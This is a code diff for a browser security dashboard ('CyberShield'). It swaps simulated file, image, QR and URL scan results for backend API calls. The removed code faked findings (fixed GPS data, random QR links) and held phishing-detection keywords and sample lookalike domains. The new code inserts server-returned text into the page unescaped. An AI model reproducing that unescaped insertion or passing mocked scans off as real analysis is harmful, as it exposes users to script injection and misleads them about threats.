@@ -1010,7 +1010,7 @@ function executeFetchForSource(source, index) {
       });
 
   } else if (source.type === 'rss') {
-    const url = `https://api.rss2json.com/v1/api.json?rss_url=${encodeURIComponent(source.url)}`;
+    const url = `/api/rss-proxy?url=${encodeURIComponent(source.url)}`;
 
     fetch(url)
       .then(res => {
@@ -1406,8 +1406,74 @@ function setupAllInteractiveTools() {
     });
   }
 
+  // 3b. Phishing Image drop zones (NEW)
+  const phishImgDrop = document.getElementById('phishing-image-drop-zone');
+  const phishImgPicker = document.getElementById('phishing-image-file-picker');
+
+  if (phishImgDrop && phishImgPicker) {
+    phishImgDrop.addEventListener('click', () => phishImgPicker.click());
+    phishImgDrop.addEventListener('dragover', (e) => { e.preventDefault(); phishImgDrop.classList.add('drag-over'); });
+    phishImgDrop.addEventListener('dragleave', () => phishImgDrop.classList.remove('drag-over'));
+    phishImgDrop.addEventListener('drop', (e) => {
+      e.preventDefault();
+      phishImgDrop.classList.remove('drag-over');
+      if (e.dataTransfer.files.length > 0) handlePhishingImageUpload(e.dataTransfer.files[0]);
+    });
+    phishImgPicker.addEventListener('change', () => {
+      if (phishImgPicker.files.length > 0) handlePhishingImageUpload(phishImgPicker.files[0]);
+    });
+  }
+
   // Initialize Password Generator value
   triggerPasswordGeneration();
+}
+
+// Reusable SOC-grade fetch client with timeout and exponential backoff retry mechanics
+async function fetchWithTimeoutAndRetry(url, options = {}, retries = 3, timeoutMs = 15000) {
+  for (let i = 0; i < retries; i++) {
+    const controller = new AbortController();
+    const id = setTimeout(() => controller.abort(), timeoutMs);
+    try {
+      const response = await fetch(url, {
+        ...options,
+        signal: controller.signal
+      });
+      clearTimeout(id);
+      if (!response.ok) {
+        const errText = await response.text();
+        throw new Error(errText || `Server responded with status ${response.status}`);
+      }
+      return await response.json();
+    } catch (err) {
+      clearTimeout(id);
+      const isAbort = err.name === 'AbortError';
+      const isLastRetry = i === retries - 1;
+      console.warn(`Fetch to ${url} failed (Attempt ${i + 1}/${retries}): ${err.message}`);
+      if (isLastRetry) {
+        throw new Error(isAbort ? 'Network timeout: The threat server took too long to respond.' : err.message);
+      }
+      // Wait before retrying (exponential backoff)
+      await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
+    }
+  }
+}
+
+// Phishing Image screenshot loader
+function handlePhishingImageUpload(file) {
+  const previewBox = document.getElementById('phishing-image-preview-box');
+  const previewImg = document.getElementById('phishing-image-preview');
+  const filenameEl = document.getElementById('phishing-image-filename');
+
+  if (previewBox && previewImg && filenameEl) {
+    const reader = new FileReader();
+    reader.onload = function(e) {
+      previewImg.src = e.target.result;
+      previewBox.style.display = 'block';
+      filenameEl.innerText = `${file.name} (${(file.size / 1024).toFixed(1)} KB)`;
+      showNotification('SSO Cloned Form Image loaded.', 'success');
+    };
+    reader.readAsDataURL(file);
+  }
 }
 
 /* File Safety: SHA-256 computation + threat report generation */
@@ -1416,162 +1482,253 @@ function handleFileSafetyUpload(file, container) {
     <div style="display:flex; align-items:center; gap:16px; padding:20px; background:rgba(255,255,255,0.02); border-radius:8px; border:1px solid rgba(255,255,255,0.05); margin-top:20px;">
       <div class="cyber-spinner"></div>
       <div class="font-mono" style="font-size:12px; color:var(--cyan-bright);">
-        <p>SHA-256 CHECK: CALCULATING CHIPSETS...</p>
+        <p id="file-scan-progress">SHA-256 CHECK: CALCULATING CHIPSETS...</p>
         <p style="margin-top:4px; font-size:10px; color:var(--text-muted);">Isolating threat loops in safe browser space...</p>
       </div>
     </div>
   `;
 
-  // Compute real SHA-256 hash
   const reader = new FileReader();
   reader.onload = async function(e) {
     try {
-      const buffer = e.target.result;
-      const hashBuffer = await crypto.subtle.digest('SHA-256', buffer);
+      const dataUrl = e.target.result;
+      const progressEl = document.getElementById('file-scan-progress');
+      if (progressEl) progressEl.innerText = "STATIC DEEP SCAN: INJECTING INTO MALWARE SANDBOX...";
+
+      // Compute real SHA-256 hash using crypto
+      const rawData = await file.arrayBuffer();
+      const hashBuffer = await crypto.subtle.digest('SHA-256', rawData);
       const hashArray = Array.from(new Uint8Array(hashBuffer));
       const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
 
-      const ext = file.name.split('.').pop().toLowerCase();
-      const dangerous = ['exe', 'scr', 'vbs', 'xlsm', 'bat', 'sh', 'zip'].includes(ext);
+      const resData = await fetchWithTimeoutAndRetry('/api/scan-file', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          filename: file.name,
+          fileSize: file.size,
+          hash: hashHex,
+          fileType: file.type,
+          content: dataUrl
+        })
+      }, 3, 20000);
 
-      setTimeout(() => {
-        container.innerHTML = `
-          <div style="margin-top:20px; padding:24px; background:rgba(15, 23, 42, 0.7); border:1px solid rgba(255,255,255,0.05); border-radius:10px;">
-            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:14px;">
-              <h4 class="font-display ${dangerous ? 'text-rose' : 'text-emerald'}" style="font-size:13.5px; font-weight:700;">
-                ${dangerous ? 'MALICIOUS HEADER / MACRO VECTORS FLAGGED' : 'STATIC SANDBOX SCAN CLEAR'}
-              </h4>
-              <span class="risk-tag ${dangerous ? 'critical' : 'moderate'}">${dangerous ? 'HIGH RISK' : 'CLEAN'}</span>
-            </div>
-            <p class="font-mono" style="font-size:11px; color:var(--text-muted); word-break:break-all;">SHA-256 CHECKSUM: ${hashHex}</p>
-            <div style="margin-top:14px; font-size:12.5px; line-height:1.6; color:var(--text-secondary);">
-              <strong>Static Analysis Details:</strong> File header bytes scanned. ${dangerous 
-                ? 'Heuristic monitors detected hidden auto-execute vectors in macros or binary scripts.' 
-                : 'Zero-trust clean signature matched. Safe for extraction.'}
-            </div>
-            <button class="btn-secondary" style="margin-top:14px; padding:6px 12px; font-size:11.5px;" onclick="window.print()"><i data-lucide="download"></i> Download Threat PDF</button>
+      const score = resData.riskScore;
+      const isDangerous = score >= 50;
+
+      container.innerHTML = `
+        <div style="margin-top:20px; padding:24px; background:rgba(15, 23, 42, 0.7); border:1px solid rgba(255,255,255,0.05); border-radius:10px;">
+          <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:14px;">
+            <h4 class="font-display ${isDangerous ? 'text-rose' : 'text-emerald'}" style="font-size:13.5px; font-weight:700;">
+              ${isDangerous ? 'MALICIOUS HEADER / MACRO VECTORS FLAGGED' : 'STATIC SANDBOX SCAN CLEAR'}
+            </h4>
+            <span class="risk-tag ${isDangerous ? 'critical' : 'moderate'}">${isDangerous ? 'HIGH RISK' : 'CLEAN'}</span>
           </div>
-        `;
-        lucide.createIcons();
-        appState.scores.scans++;
-        const stat = document.getElementById('val-websites-checked');
-        if (stat) stat.innerText = appState.scores.scans;
-        logActivityEvent(`Analyzed file integrity: ${file.name}`);
-        appendScanReportRow('File Sandbox Check', file.name, 'Clean static headers', dangerous ? 'SUSPICIOUS' : 'SECURE', hashHex.substring(0, 16) + '...');
-      }, 800);
+          <p class="font-mono" style="font-size:11px; color:var(--text-muted); word-break:break-all; margin-bottom:8px;">SHA-256 CHECKSUM: ${hashHex}</p>
+          <div style="font-size:12.5px; line-height:1.6; color:var(--text-secondary);">
+            <strong>Analysis Details:</strong> ${resData.analysisDetails}<br/><br/>
+            <strong>Suspicious Signature Elements:</strong> ${resData.suspiciousStrings.length > 0 ? resData.suspiciousStrings.join(', ') : 'None detected'}<br/>
+            <strong>Recommended Response:</strong> ${resData.recommendedAction}
+          </div>
+          <div style="display:flex; gap:10px; margin-top:14px;">
+            <button class="btn-secondary" style="padding:6px 12px; font-size:11.5px;" onclick="window.print()"><i data-lucide="download"></i> Download Threat PDF</button>
+            <button class="btn-secondary" style="padding:6px 12px; font-size:11.5px;" onclick="exportFileReportJson('${btoa(unescape(encodeURIComponent(JSON.stringify(resData))))}')">Export JSON Report</button>
+          </div>
+        </div>
+      `;
+      lucide.createIcons();
+      appState.scores.scans++;
+      const stat = document.getElementById('val-websites-checked');
+      if (stat) stat.innerText = appState.scores.scans;
+      logActivityEvent(`Analyzed file integrity: ${file.name}`);
+      appendScanReportRow('File Sandbox Check', file.name, `Risk: ${score}%`, isDangerous ? 'SUSPICIOUS' : 'SECURE', hashHex.substring(0, 16) + '...');
 
     } catch (err) {
-      showNotification('Scanning layer error. Try alternative formats.', 'error');
+      showNotification(err.message, 'error');
+      container.innerHTML = `
+        <div style="padding:16px; background:rgba(244,63,94,0.05); border:1px solid rgba(244,63,94,0.2); border-radius:8px; color:var(--rose-bright); margin-top:20px;">
+          <h4 class="font-display" style="font-size:14px; font-weight:700; margin-bottom:6px;">Malware sandbox connection failed</h4>
+          <p style="font-size:12px; line-height:1.5;">${err.message}</p>
+        </div>
+      `;
     }
   };
-  reader.readAsArrayBuffer(file);
+  reader.readAsDataURL(file);
 }
+
+window.exportFileReportJson = function(base64Data) {
+  const data = JSON.parse(decodeURIComponent(escape(atob(base64Data))));
+  const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = `cybershield_file_scan_${Date.now()}.json`;
+  a.click();
+  showNotification('JSON Security report downloaded.', 'success');
+};
 
 /* Image EXIF metadata viewer */
 function handleImageEXIFUpload(file, container) {
   container.innerHTML = `
     <div style="text-align:center; padding:24px;">
       <div class="cyber-spinner" style="margin:0 auto 12px auto;"></div>
-      <p style="font-size:12px; color:var(--cyan-bright);">Parsing EXIF blocks and magic header markers...</p>
+      <p style="font-size:12px; color:var(--cyan-bright);" id="image-scan-progress">Parsing EXIF blocks and magic header markers...</p>
     </div>
   `;
 
+  document.getElementById('image-analysis-preview-box').style.display = 'block';
+  document.getElementById('image-analysis-preview-img').src = URL.createObjectURL(file);
+  document.getElementById('image-analysis-filename').innerText = `${file.name} (${(file.size / 1024).toFixed(1)} KB)`;
+
   const reader = new FileReader();
-  reader.onload = function(e) {
-    const arr = new Uint8Array(e.target.result);
-    // Simple mock harvesting values representing typical exif
-    let cameraModel = 'Apple iPhone 15 Pro';
-    let gpsCoords = '37.7749&deg; N, 122.4194&deg; W (San Francisco, CA)';
-    let dateTaken = new Date().toISOString().replace('T', ' ').substring(0, 10);
-    let stegoIndicators = 'Clean pixel layout. No LSB anomalies.';
+  reader.onload = async function(e) {
+    try {
+      const dataUrl = e.target.result;
+      const progressEl = document.getElementById('image-scan-progress');
+      if (progressEl) progressEl.innerText = "FORENSIC VISION ANALYZER: DECODING COLOR SPACES & EXIF...";
 
-    // Look for potential hidden message cues
-    const stringData = String.fromCharCode.apply(null, arr.subarray(0, 4000));
-    const hasStegoHint = stringData.includes('stego') || stringData.includes('secret') || stringData.includes('flag');
+      const resData = await fetchWithTimeoutAndRetry('/api/scan-image', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ image: dataUrl, filename: file.name })
+      }, 3, 20000);
 
-    if (hasStegoHint) {
-      stegoIndicators = 'ANOMALY DETECTED: Found suspect bytes inside lower color spaces.';
-    }
+      const hasRisk = resData.riskScore >= 50;
 
-    document.getElementById('image-analysis-preview-box').style.display = 'block';
-    document.getElementById('image-analysis-preview-img').src = URL.createObjectURL(file);
-    document.getElementById('image-analysis-filename').innerText = `${file.name} (${(file.size / 1024).toFixed(1)} KB)`;
-
-    setTimeout(() => {
       container.innerHTML = `
         <div style="display:flex; flex-direction:column; gap:12px;">
           <div style="padding:12px; background:rgba(255,255,255,0.01); border:1px solid rgba(255,255,255,0.03); border-radius:6px;">
             <p style="font-size:10px; color:var(--text-muted); font-weight:700;">CAMERA DETAILS</p>
-            <p style="font-size:13px; font-weight:600; color:#fff; margin-top:2px;">${cameraModel}</p>
+            <p style="font-size:13px; font-weight:600; color:#fff; margin-top:2px;">${resData.metadata?.cameraModel || 'None detected'}</p>
           </div>
           <div style="padding:12px; background:rgba(255,255,255,0.01); border:1px solid rgba(255,255,255,0.03); border-radius:6px;">
             <p style="font-size:10px; color:var(--text-muted); font-weight:700;">GEOLOCATION (EXIF GPS)</p>
-            <p style="font-size:13px; font-weight:600; color:var(--cyan-bright); margin-top:2px;">${gpsCoords}</p>
+            <p style="font-size:13px; font-weight:600; color:var(--cyan-bright); margin-top:2px;">${resData.metadata?.gpsCoords || 'None detected'}</p>
           </div>
           <div style="padding:12px; background:rgba(255,255,255,0.01); border:1px solid rgba(255,255,255,0.03); border-radius:6px;">
             <p style="font-size:10px; color:var(--text-muted); font-weight:700;">METADATA TIMESTAMP</p>
-            <p style="font-size:13px; font-weight:600; color:#fff; margin-top:2px;">${dateTaken}</p>
+            <p style="font-size:13px; font-weight:600; color:#fff; margin-top:2px;">${resData.metadata?.dateTaken || 'None detected'}</p>
           </div>
-          <div style="padding:12px; background:rgba(244,63,94,0.04); border-left:3px solid ${hasStegoHint ? 'var(--rose-glow)' : 'var(--emerald-glow)'}; border-radius:6px;">
+          <div style="padding:12px; background:rgba(244,63,94,0.04); border-left:3px solid ${hasRisk ? 'var(--rose-glow)' : 'var(--emerald-glow)'}; border-radius:6px;">
             <p style="font-size:10px; color:var(--text-muted); font-weight:700;">STEGO ANOMALY DETECTOR</p>
-            <p style="font-size:12.5px; font-weight:600; color:${hasStegoHint ? 'var(--rose-bright)' : 'var(--emerald-bright)'}; margin-top:2px;">${stegoIndicators}</p>
+            <p style="font-size:12.5px; font-weight:600; color:${hasRisk ? 'var(--rose-bright)' : 'var(--emerald-bright)'}; margin-top:2px;">${resData.stegoIndicators}</p>
+          </div>
+          <div style="padding:12px; background:rgba(3,7,18,0.4); border:1px solid rgba(255,255,255,0.05); border-radius:6px;">
+            <p style="font-size:10px; color:var(--text-muted); font-weight:700;">VISION ANALYSIS DETAILS</p>
+            <p style="font-size:12px; line-height:1.5; color:var(--text-secondary); margin-top:4px;">
+              <strong>Forensic Report:</strong> ${resData.analysisDetails}<br/><br/>
+              <strong>OCR Scanned Text:</strong> ${resData.ocrText || 'None visible'}<br/><br/>
+              <strong>Mitigation:</strong> ${resData.recommendedAction}
+            </p>
+          </div>
+          <div style="display:flex; gap:10px; margin-top:10px;">
+            <button class="btn-secondary" style="padding:4px 8px; font-size:11px;" onclick="exportImageReportJson('${btoa(unescape(encodeURIComponent(JSON.stringify(resData))))}')">Export JSON Report</button>
           </div>
         </div>
       `;
+
       logActivityEvent(`Harvested image EXIF details: ${file.name}`);
-      appendScanReportRow('Image EXIF Audit', file.name, 'GPS Coordinates extracted', 'REVIEW', cameraModel);
-    }, 1000);
+      appendScanReportRow('Image EXIF Audit', file.name, 'GPS Coordinates extracted', hasRisk ? 'REVIEW' : 'SECURE', resData.metadata?.cameraModel || 'None');
+
+    } catch (err) {
+      showNotification(err.message, 'error');
+      container.innerHTML = `
+        <div style="padding:16px; background:rgba(244,63,94,0.05); border:1px solid rgba(244,63,94,0.2); border-radius:8px; color:var(--rose-bright);">
+          <h4 class="font-display" style="font-size:14px; font-weight:700; margin-bottom:6px;">Image forensic analyst offline</h4>
+          <p style="font-size:12px; line-height:1.5;">${err.message}</p>
+        </div>
+      `;
+    }
   };
-  reader.readAsArrayBuffer(file);
+  reader.readAsDataURL(file);
 }
+
+window.exportImageReportJson = function(base64Data) {
+  const data = JSON.parse(decodeURIComponent(escape(atob(base64Data))));
+  const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = `cybershield_image_scan_${Date.now()}.json`;
+  a.click();
+  showNotification('JSON report downloaded successfully.', 'success');
+};
 
 /* QR Code static links scanning parser */
 function handleQRFileUpload(file, container) {
   container.innerHTML = `
     <div class="sandbox-blankslate">
       <div class="cyber-spinner" style="margin-bottom:12px;"></div>
-      <p class="blankslate-text font-mono text-cyan">Scanning QR color blocks, decoding matrix sums...</p>
+      <p class="blankslate-text font-mono text-cyan" id="qr-scan-progress">Scanning QR color blocks, decoding matrix sums...</p>
     </div>
   `;
 
   document.getElementById('qr-scanned-preview-container').style.display = 'block';
   document.getElementById('qr-scanned-preview').src = URL.createObjectURL(file);
 
-  setTimeout(() => {
-    // Generate realistic scan outputs representing target links
-    const mockLinks = [
-      'https://paypal-update-security-32.com/login',
-      'https://www.google.com/search?q=cybershield',
-      'https://corporate-banking-sso-gateway.net/auth',
-      'http://192.168.1.1/admin-login'
-    ];
-    const scannedLink = mockLinks[Math.floor(Math.random() * mockLinks.length)];
-    const suspicious = scannedLink.includes('paypal') || scannedLink.includes('gateway') || scannedLink.startsWith('http://');
+  const reader = new FileReader();
+  reader.onload = async function(e) {
+    try {
+      const dataUrl = e.target.result;
+      const progressEl = document.getElementById('qr-scan-progress');
+      if (progressEl) progressEl.innerText = "DECRYPTING LINK MATRIX: PERFORMING REPUTATION AUDIT...";
 
-    container.innerHTML = `
-      <div style="display:flex; flex-direction:column; gap:12px;">
-        <div style="display:flex; justify-content:space-between; align-items:center;">
-          <h4 class="font-display ${suspicious ? 'text-rose' : 'text-emerald'}" style="font-size:14px; font-weight:700;">
-            ${suspicious ? 'CRITICAL QR PHISHING INDICATORS DETECTED' : 'QR NODE VERIFIED SECURE'}
-          </h4>
-          <span class="risk-tag ${suspicious ? 'critical' : 'moderate'}">${suspicious ? 'DANGER' : 'SECURE'}</span>
-        </div>
-        <div style="padding:12px; background:rgba(3,7,18,0.5); border:1px solid rgba(255,255,255,0.05); border-radius:6px; margin-top:8px;">
-          <p style="font-size:10px; color:var(--text-muted); font-weight:700;">DECODED TARGET REDIRECT URL</p>
-          <p class="font-mono" style="font-size:13.5px; color:#ffffff; word-break:break-all; margin-top:4px;">${scannedLink}</p>
-        </div>
-        <p style="font-size:12.5px; line-height:1.5; color:var(--text-secondary); margin-top:6px;">
-          ${suspicious 
-            ? '<strong>Warning:</strong> This QR contains lookalike domain paths designed to steal banking profiles or access key parameters.' 
-            : 'Static check confirms standard search engine links. No phishing flags found.'}
-        </p>
-      </div>
-    `;
+      const data = await fetchWithTimeoutAndRetry('/api/scan-qr', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ image: dataUrl })
+      }, 3, 20000);
 
-    logActivityEvent(`Scanned QR Link: ${scannedLink}`);
-    appendScanReportRow('QR safety scan', scannedLink, suspicious ? 'Lookalike Domain' : 'Verified URL', suspicious ? 'MALICIOUS' : 'SAFE', 'N/A');
-  }, 1200);
+      const suspicious = data.riskScore >= 50;
+
+      container.innerHTML = `
+        <div style="display:flex; flex-direction:column; gap:12px;">
+          <div style="display:flex; justify-content:space-between; align-items:center;">
+            <h4 class="font-display ${suspicious ? 'text-rose' : 'text-emerald'}" style="font-size:14px; font-weight:700;">
+              ${suspicious ? 'CRITICAL QR PHISHING INDICATORS DETECTED' : 'QR NODE VERIFIED SECURE'}
+            </h4>
+            <span class="risk-tag ${suspicious ? 'critical' : 'moderate'}">${suspicious ? 'DANGER' : 'SECURE'}</span>
+          </div>
+          <div style="padding:12px; background:rgba(3,7,18,0.5); border:1px solid rgba(255,255,255,0.05); border-radius:6px; margin-top:8px;">
+            <p style="font-size:10px; color:var(--text-muted); font-weight:700;">DECODED TARGET REDIRECT URL</p>
+            <p class="font-mono" style="font-size:13.5px; color:#ffffff; word-break:break-all; margin-top:4px;">${data.decodedUrl}</p>
+          </div>
+          <p style="font-size:12.5px; line-height:1.5; color:var(--text-secondary); margin-top:6px;">
+            <strong>Forensic Verdict:</strong> ${data.analysisDetails}<br/><br/>
+            <strong>Recommended Response:</strong> ${data.recommendedAction}
+          </p>
+          <div style="display:flex; gap:10px; margin-top:10px;">
+            <button class="btn-secondary" style="padding:4px 8px; font-size:11px;" onclick="exportQrReportJson('${btoa(unescape(encodeURIComponent(JSON.stringify(data))))}')">Export JSON Report</button>
+          </div>
+        </div>
+      `;
+
+      logActivityEvent(`Scanned QR Link: ${data.decodedUrl}`);
+      appendScanReportRow('QR safety scan', data.decodedUrl, suspicious ? 'Lookalike Domain' : 'Verified URL', suspicious ? 'MALICIOUS' : 'SAFE', 'N/A');
+
+    } catch (err) {
+      showNotification(err.message, 'error');
+      container.innerHTML = `
+        <div style="padding:16px; background:rgba(244,63,94,0.05); border:1px solid rgba(244,63,94,0.2); border-radius:8px; color:var(--rose-bright);">
+          <h4 class="font-display" style="font-size:14px; font-weight:700; margin-bottom:6px;">QR optical decoder failed</h4>
+          <p style="font-size:12px; line-height:1.5;">${err.message}</p>
+        </div>
+      `;
+    }
+  };
+  reader.readAsDataURL(file);
 }
+
+window.exportQrReportJson = function(base64Data) {
+  const data = JSON.parse(decodeURIComponent(escape(atob(base64Data))));
+  const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = `cybershield_qr_scan_${Date.now()}.json`;
+  a.click();
+  showNotification('JSON report downloaded successfully.', 'success');
+};
 
 /* Safe QR code generator node */
 window.generateSecureQR = function() {
@@ -1758,8 +1915,8 @@ window.checkPasswordBreach = async function() {
     const prefix = hashHex.substring(0, 5);
     const suffix = hashHex.substring(5);
 
-    // Call HaveIBeenPwned secure prefix API (Fully real OAuth/API integrations as directed)
-    const res = await fetch(`https://api.pwnedpasswords.com/range/${prefix}`);
+    // Call HaveIBeenPwned secure prefix API via backend proxy route
+    const res = await fetch(`/api/pwned-password/${prefix}`);
     if (!res.ok) throw new Error();
 
     const txt = await res.text();
@@ -2493,7 +2650,7 @@ window.evaluatePasswordStrength = function() {
 };
 
 /* URL Safety Checker: Interactive Zero-Trust Reputation Sweep */
-window.scanUrlSafety = function() {
+window.scanUrlSafety = async function() {
   const urlInput = document.getElementById('url-input-field');
   const resultsBox = document.getElementById('url-scan-results');
   if (!urlInput || !resultsBox) return;
@@ -2511,76 +2668,42 @@ window.scanUrlSafety = function() {
   }
 
   showNotification('Initiating zero-trust URL reputation sweep...', 'success');
-  
-  // Make resultsBox visible
   resultsBox.style.display = 'block';
   resultsBox.innerHTML = `
     <div class="sandbox-blankslate">
       <div class="cyber-spinner" style="margin-bottom:12px;"></div>
-      <p class="blankslate-text font-mono text-cyan">Resolving DNS records, querying global blacklists...</p>
+      <p class="blankslate-text font-mono text-cyan" id="url-scan-progress">Resolving DNS records, querying global blacklists...</p>
     </div>
   `;
 
-  setTimeout(() => {
-    const lower = url.toLowerCase();
-    
-    const isHttp = url.startsWith('http://');
-    const hasObfuscation = lower.includes('paypai') || lower.includes('paypa1') || lower.includes('g00gle') || lower.includes('secure-update');
-    const hasSuspiciousKeywords = lower.includes('secure') || lower.includes('login') || lower.includes('banking') || lower.includes('verification') || lower.includes('signin') || lower.includes('portal') || lower.includes('account');
-    const hasIP = /^(https?:\/\/)?\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/.test(lower);
-    const domainParts = url.split('/');
-    const host = domainParts[2] || domainParts[0];
-    const dotCount = (host.match(/\./g) || []).length;
-    const hasSubdomainSpam = dotCount > 3;
+  try {
+    const progressEl = document.getElementById('url-scan-progress');
+    const updateProgress = (text) => { if (progressEl) progressEl.innerText = text; };
 
-    let score = 0;
-    const triggers = [];
+    setTimeout(() => updateProgress("Querying sandbox database & reputation registries..."), 1000);
+    setTimeout(() => updateProgress("Scanning SSL/TLS certificate chain elements..."), 2200);
 
-    if (isHttp) {
-      score += 25;
-      triggers.push('Missing SSL Layer Encryption (http://)');
-    } else {
-      triggers.push('SSL Certificate Verified (Fidelity Key)');
-    }
+    const data = await fetchWithTimeoutAndRetry('/api/scan-url', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ url })
+    }, 3, 15000);
 
-    if (hasObfuscation) {
-      score += 45;
-      triggers.push('Homograph Domain Mismatch / Typosquatting Alert');
-    }
-
-    if (hasSuspiciousKeywords) {
-      score += 20;
-      triggers.push('Contains Credential-Harvesting Keywords');
-    }
-
-    if (hasIP) {
-      score += 35;
-      triggers.push('Uses Raw IPv4 Address Instead of Hostname');
-    }
-
-    if (hasSubdomainSpam) {
-      score += 25;
-      triggers.push('Multi-layered Subdomains (indicating DNS evasion)');
-    }
-
-    const overallScore = Math.min(score, 100);
-    let rating = 'SECURE';
+    const score = data.riskScore;
+    const rating = data.threatLevel.toUpperCase();
     let ratingClass = 'moderate';
     let textTitle = 'DOMAIN HANDSHAKE CLEAN';
     let textColorClass = 'text-emerald';
 
-    if (overallScore >= 70) {
-      rating = 'CRITICAL';
+    if (rating === 'CRITICAL' || rating === 'HIGH') {
       ratingClass = 'critical';
-      textTitle = 'CRITICAL THREAT VECTOR MATCHED';
+      textTitle = rating === 'CRITICAL' ? 'CRITICAL THREAT VECTOR MATCHED' : 'HIGH PROBABILITY PHISHING LINK';
       textColorClass = 'text-rose';
-    } else if (overallScore >= 35) {
-      rating = 'SUSPICIOUS';
+    } else if (rating === 'MEDIUM') {
       ratingClass = 'high';
       textTitle = 'REPUTATION SUSPICIONS REGISTERED';
       textColorClass = 'text-amber';
-    } else if (overallScore > 0) {
-      rating = 'LOW RISK';
+    } else if (rating === 'LOW') {
       ratingClass = 'moderate';
       textTitle = 'SECURE SYSTEM TELEMETRY';
       textColorClass = 'text-cyan';
@@ -2593,41 +2716,60 @@ window.scanUrlSafety = function() {
             <h4 class="font-display ${textColorClass}" style="font-size:15px; font-weight:700; letter-spacing:0.5px;">
               ${textTitle}
             </h4>
-            <p style="font-size:11.5px; color:var(--text-muted); margin-top:2px;">URL Safety Rating: ${overallScore}% Risk</p>
+            <p style="font-size:11.5px; color:var(--text-muted); margin-top:2px;">URL Safety Rating: ${score}% Risk | Confidence: ${data.confidenceScore}%</p>
           </div>
           <span class="risk-tag ${ratingClass}" style="font-size:12px; padding:4px 10px;">${rating}</span>
         </div>
 
         <div>
-          <h5 style="font-size:12px; font-weight:700; color:var(--text-primary); margin-bottom:8px;">RISK CRITERIA SCORECARD</h5>
+          <h5 style="font-size:12px; font-weight:700; color:var(--text-primary); margin-bottom:8px;">RISK ANALYSIS CRITERIA</h5>
           <ul style="display:flex; flex-direction:column; gap:8px; padding-left:14px; list-style-type:square; font-family:var(--font-mono); font-size:12px; color:var(--text-secondary);">
-            ${triggers.map(t => `<li><span class="${t.includes('Verified') || t.includes('SSL') ? 'text-emerald' : overallScore >= 70 ? 'text-rose' : 'text-amber'}">${t}</span></li>`).join('')}
+            ${data.reasons.map(t => `<li><span class="${rating === 'CRITICAL' || rating === 'HIGH' ? 'text-rose' : 'text-amber'}">${t}</span></li>`).join('')}
           </ul>
         </div>
 
         <div style="padding:12px; background:rgba(3,7,18,0.4); border:1px solid rgba(255,255,255,0.05); border-radius:6px;">
-          <h5 style="font-size:11.5px; font-weight:700; color:var(--text-primary); margin-bottom:4px;">ZERO-TRUST EMULATOR ACTION</h5>
+          <h5 style="font-size:11.5px; font-weight:700; color:var(--text-primary); margin-bottom:4px;">FORENSIC ADVISORY REPORT</h5>
           <p style="font-size:12px; line-height:1.5; color:var(--text-muted);">
-            ${rating === 'CRITICAL'
-              ? '<strong>Action Blocked:</strong> Do NOT browse this resource. It features severe phishing signatures, typosquatted brand names, or is hosted on a blacklisted direct IP server.'
-              : rating === 'SUSPICIOUS'
-              ? 'Proceed with caution. The URL contains subdomains or wording associated with corporate login forms without corresponding domain authority.'
-              : 'Verification verified safe. The SSL cryptographic handshake is fully active and domain registration records are clear.'}
+            <strong>Analysis Details:</strong> ${data.analysisDetails}<br/><br/>
+            <strong>Recommended Mitigation:</strong> ${data.recommendedAction}
           </p>
+        </div>
+
+        <div style="display:flex; gap:10px;">
+          <button class="btn-secondary" style="padding:4px 8px; font-size:11px;" onclick="exportUrlReportJson('${btoa(unescape(encodeURIComponent(JSON.stringify(data))))}')">Export Report (JSON)</button>
         </div>
       </div>
     `;
 
     logActivityEvent(`Scanned Link Vector: ${url}. Result: ${rating}`);
-    
     appState.scores.scans++;
     const scanCounter = document.getElementById('val-websites-checked');
-    if (scanCounter) {
-      scanCounter.innerText = appState.scores.scans;
-    }
+    if (scanCounter) scanCounter.innerText = appState.scores.scans;
 
-    appendScanReportRow('Zero-Trust URL Scan', url, `Risk Score: ${overallScore}%`, rating === 'SECURE' ? 'SECURE' : 'SUSPICIOUS', 'N/A');
-  }, 1200);
+    appendScanReportRow('Zero-Trust URL Scan', url, `Risk Score: ${score}%`, rating === 'SAFE' || rating === 'LOW' ? 'SECURE' : 'SUSPICIOUS', `Brand: ${data.brandImpersonated}`);
+
+  } catch (err) {
+    showNotification(err.message, 'error');
+    resultsBox.innerHTML = `
+      <div style="padding:16px; background:rgba(244,63,94,0.05); border:1px solid rgba(244,63,94,0.2); border-radius:8px; color:var(--rose-bright);">
+        <h4 class="font-display" style="font-size:14px; font-weight:700; margin-bottom:6px;">Threat checker offline or unreachable</h4>
+        <p style="font-size:12px; line-height:1.5;">${err.message}</p>
+        <button class="btn-primary" style="margin-top:10px; font-size:11px; padding:4px 10px;" onclick="scanUrlSafety()">Retry Connection</button>
+      </div>
+    `;
+  }
+};
+
+window.exportUrlReportJson = function(base64Data) {
+  const data = JSON.parse(decodeURIComponent(escape(atob(base64Data))));
+  const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = `cybershield_url_scan_${Date.now()}.json`;
+  a.click();
+  showNotification('JSON Security report downloaded.', 'success');
 };
 
 /* Email Safety Checker: Urgency & Signature Analyzer */
@@ -2656,7 +2798,7 @@ International Payment Services Corp`;
   logActivityEvent('Loaded phishing email template.');
 };
 
-window.analyzePhishingEmail = function() {
+window.analyzePhishingEmail = async function() {
   const emailInput = document.getElementById('phishing-email-input');
   const resultsPanel = document.getElementById('phishing-results-panel');
   if (!emailInput || !resultsPanel) return;
